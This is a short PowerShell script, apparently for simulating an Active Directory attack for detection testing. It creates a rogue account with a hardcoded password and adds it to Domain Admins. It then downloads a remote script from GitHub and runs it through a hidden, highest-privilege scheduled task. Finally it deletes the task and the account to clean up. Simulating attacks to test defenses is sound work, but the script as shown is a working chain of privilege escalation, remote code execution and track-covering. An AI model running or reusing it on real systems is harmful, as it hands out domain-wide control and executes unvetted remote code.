Import-Module ActiveDirectory

$userName = "EvilUser" + (Get-Random -Minimum 100 -Maximum 999)
$password = "Password123!" | ConvertTo-SecureString -AsPlainText -Force
New-ADUser -Name $userName -AccountPassword $password -Enabled $true -PasswordNeverExpires $true -ChangePasswordAtLogon $false -CannotChangePassword $true

$domainAdminGroup = "Domain Admins"
Add-ADGroupMember -Identity $domainAdminGroup -Members $userName

$scriptPath = "C:\demo\follow.ps1"
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/natashell666/DemoScripts/main/ADSimulAttack/follow.ps1" -OutFile $scriptPath

$action = New-ScheduledTaskAction -Execute "Powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -File `"$scriptPath`" -username `"$userName`""
$trigger = New-ScheduledTaskTrigger -AtStartup
$settings = New-ScheduledTaskSettingsSet -MultipleInstances IgnoreNew -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -StartWhenAvailable
$principal = New-ScheduledTaskPrincipal -UserId "$userName" -LogonType S4U -RunLevel Highest

$taskName = "RunMalwLessAsNewUser"
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -Description "Run MalwLess as new user" -User $userName -Password "Password123!"

Start-ScheduledTask -TaskName $taskName

Start-Sleep -Seconds 30

Unregister-ScheduledTask -TaskName $taskName -Confirm:$false

Remove-ADUser -Identity $userName -Confirm:$false 
